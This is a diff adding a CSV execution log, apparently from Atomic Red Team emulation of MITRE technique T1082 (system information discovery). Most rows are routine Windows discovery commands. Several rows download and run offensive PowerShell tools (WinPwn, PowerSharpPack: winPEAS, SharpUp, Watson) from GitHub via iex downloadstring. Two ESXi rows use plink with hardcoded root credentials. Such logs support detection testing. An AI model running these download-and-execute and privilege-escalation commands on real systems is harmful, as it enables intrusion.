@@ -1,0 +1,64 @@
+﻿Mitre Technique Id,Procedure Name,Start Time,Stop Time,Command
+T1082,WinPwn - PowerSharpPack - Watson searching for missing windows patches,10/12/2024 18:07:27,10/12/2024 18:07:30,"iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1)
+Invoke-watson"
+T1082,ESXi - VM Discovery using ESXCLI,10/12/2024 18:09:11,10/12/2024 18:09:13,"echo """" | ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\plink.exe"" ""atomic.local"" -ssh  -l ""root"" -pw ""pass"" -m ""C:\AtomicRedTeam\atomics\T1082\src\esx_vmdiscovery.txt""
+"
+T1082,Windows MachineGUID Discovery,10/12/2024 18:06:14,10/12/2024 18:06:14,"REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
+"
+T1082,WinPwn - Morerecon,10/12/2024 18:07:11,10/12/2024 18:07:14,"$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t
+iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)
+Morerecon -noninteractive -consoleoutput"
+T1082,WinPwn - Powersploits privesc checks,10/12/2024 18:06:47,10/12/2024 18:06:51,"$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t
+iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)
+oldchecks -noninteractive -consoleoutput"
+T1082,WinPwn - itm4nprivesc,10/12/2024 18:06:39,10/12/2024 18:06:43,"$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t
+iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)
+itm4nprivesc -noninteractive -consoleoutput"
+T1082,System Information Discovery,10/12/2024 18:07:56,10/12/2024 18:08:58,"wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
+"
+T1082,WinPwn - General privesc checks,10/12/2024 18:06:56,10/12/2024 18:06:59,"$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t
+iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)
+otherchecks -noninteractive -consoleoutput"
+T1082,WinPwn - PowerSharpPack - Seatbelt,10/12/2024 18:07:43,10/12/2024 18:07:47,"iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1)
+Invoke-Seatbelt -Command ""-group=all"""
+T1082,System Information Discovery,10/12/2024 18:06:03,10/12/2024 18:06:06,"systeminfo
+reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
+"
+T1082,Griffon Recon,10/12/2024 18:06:19,10/12/2024 18:06:21,"cscript ""C:\AtomicRedTeam\atomics\T1082\src\griffon_recon.vbs""
+"
+T1082,operating system discovery ,10/12/2024 18:09:24,10/12/2024 18:09:26,"Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null"
+T1082,WinPwn - GeneralRecon,10/12/2024 18:07:03,10/12/2024 18:07:07,"$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t
+iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)
+Generalrecon -consoleoutput -noninteractive"
+T1082,Hostname Discovery (Windows),10/12/2024 18:06:10,10/12/2024 18:06:10,"hostname
+"
+T1082,System Information Discovery with WMIC,10/12/2024 18:07:52,10/12/2024 18:07:52,"wmic cpu get name
+wmic MEMPHYSICAL get MaxCapacity
+wmic baseboard get product
+wmic baseboard get version
+wmic bios get SMBIOSBIOSVersion
+wmic path win32_VideoController get name
+wmic path win32_VideoController get DriverVersion
+wmic path win32_VideoController get VideoModeDescription
+wmic OS get Caption,OSArchitecture,Version
+wmic DISKDRIVE get Caption
+Get-WmiObject win32_bios
+"
+T1082,Check computer location,10/12/2024 18:09:02,10/12/2024 18:09:02,"reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""
+"
+T1082,WinPwn - RBCD-Check,10/12/2024 18:07:19,10/12/2024 18:07:22,"$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t
+iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)
+RBCD-Check -consoleoutput -noninteractive"
+T1082,WinPwn - winPEAS,10/12/2024 18:06:30,10/12/2024 18:06:35,"$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t
+iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)
+winPEAS -noninteractive -consoleoutput"
+T1082,WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,10/12/2024 18:07:35,10/12/2024 18:07:38,"iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1)
+Invoke-SharpUp -command ""audit"""
+T1082,BIOS Information Discovery through Registry,10/12/2024 18:09:06,10/12/2024 18:09:06,"reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
+reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
+"
+T1082,Environment variables discovery on windows,10/12/2024 18:06:26,10/12/2024 18:06:26,"set
+"
+T1082,Check OS version via "ver" command,10/12/2024 18:09:30,10/12/2024 18:09:30,"ver"
+T1082,ESXi - Darkside system information discovery,10/12/2024 18:09:18,10/12/2024 18:09:21,"echo """" | ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\plink.exe"" ""atomic.local"" -ssh  -l ""root"" -pw ""pass"" -m ""C:\AtomicRedTeam\atomics\T1082\src\esx_darkside_discovery.txt""
+"
